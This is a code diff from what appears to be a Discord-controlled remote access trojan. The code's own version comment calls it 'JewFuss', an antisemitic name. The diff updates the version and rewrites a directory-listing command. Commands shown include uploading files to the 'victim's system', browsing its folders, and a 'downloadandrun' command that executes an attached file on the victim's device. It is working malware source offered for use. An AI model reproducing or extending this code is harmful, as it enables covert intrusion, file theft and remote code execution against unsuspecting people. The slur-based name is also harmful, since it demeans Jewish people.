@@ -55,7 +55,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.12.4" # Replace with current JewFuss version, shows in some commands. Compiler looks for this comment for updates, so DO NOT MODIFY THIS COMMENT! - 25c75g
+version = "1.0.13.0" # Replace with current JewFuss version, shows in some commands. Compiler looks for this comment for updates, so DO NOT MODIFY THIS COMMENT! - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon (right click to see version and exit button). DO NOT MODIFY THIS COMMENT! (easy compiler looks for this) | Default: False - 28f93g
 
 starttime = time.perf_counter()
@@ -2473,7 +2473,7 @@ async def write(ctx, *, text: str):
     except Exception as e:
         await ctx.send(f"Error executing command: {str(e)}")
         
-@bot.command(help="Upload a file to a specific path on victim's system", usage="$upload <destination>")
+@bot.command(help="Upload a file to a specific path on victim's system", usage="$upload <folder>")
 async def upload(ctx, folder: str = None):
     if not folder:
         await ctx.send("Error: No folder path provided. Please specify a folder to upload the file to.")
@@ -2499,40 +2499,48 @@ async def upload(ctx, folder: str = None):
     except Exception as e:
         await ctx.send(f"Error: Failed to upload file. {e}")
 
-@bot.command(help="Lists contents of a folder on the system", usage="$ls <folder>")
-async def ls(ctx, path: str = None):
+@bot.command(help="Lists contents of a folder on the system", usage="$ls <path>")
+async def ls(ctx, *, path: str = None):
     try:
         if not path:
             await ctx.send("Error: No path provided. Please specify a directory path to list.")
             return
 
-        if not os.path.exists(path):
-            await ctx.send(f"Error: The path '{path}' does not exist.")
-            return
-        if not os.path.isdir(path):
-            await ctx.send(f"Error: The path '{path}' is not a directory.")
+        path = pathlib.Path(path)
+
+        if not path.is_absolute():
+            await ctx.send("Error: Path must be an absolute path.")
             return
 
-        items = os.listdir(path)
-        parent_dir = os.path.abspath(os.path.join(path, os.pardir))
-        dirs = sorted([item for item in items if os.path.isdir(os.path.join(path, item))])
-        files = sorted([item for item in items if os.path.isfile(os.path.join(path, item))])
-        response = f"Parent Directory: {parent_dir}\n\n"
+        if not path.exists():
+            await ctx.send(f"Error: The path '{path.as_posix()}' does not exist.")
+            return
+
+        header_txt = f"Showing contents of **{path.as_posix()}**"
+
+        if not path.is_dir():
+            header_txt += "\n-# **⚠** Path is a file, displaying its parent directory."
+            path = path.parent
+
+        items = list(path.iterdir())
+        dirs = sorted((item for item in items if item.is_dir()), key=lambda p: p.name.lower())
+        files = sorted((item for item in items if item.is_file()), key=lambda p: p.name.lower())
+
+        response = f"> -# [PARENT]: {path.parent.as_posix()}\n\n"
 
         if dirs or files:
             for directory in dirs:
-                dir_full_path = os.path.join(path, directory)
-                response += f"[DIR]  {dir_full_path}\n"
+                response += f"[DIR]  {directory.as_posix()}\n"
+
             for file in files:
-                file_full_path = os.path.join(path, file)
-                response += f"[FILE] {file_full_path}\n"
+                response += f"[FILE] {file.as_posix()}\n"
         else:
             response += "This directory is empty.\n"
 
-        await ctx.fm_send(header=f"Contents of directory: {path}", content=response, filename="directory_contents.txt")
-        
+        await ctx.fm_send(header=header_txt, content=response, filename="directory_contents.txt")
+
     except Exception as e:
-        await ctx.send(f"Error: Could not list the directory contents. {str(e)}")
+        await ctx.send(f"Error: Could not list the directory contents. {e}")
 
 @bot.command(help="Downloads attached file and runs it on the victim's device.")
 async def downloadandrun(ctx):
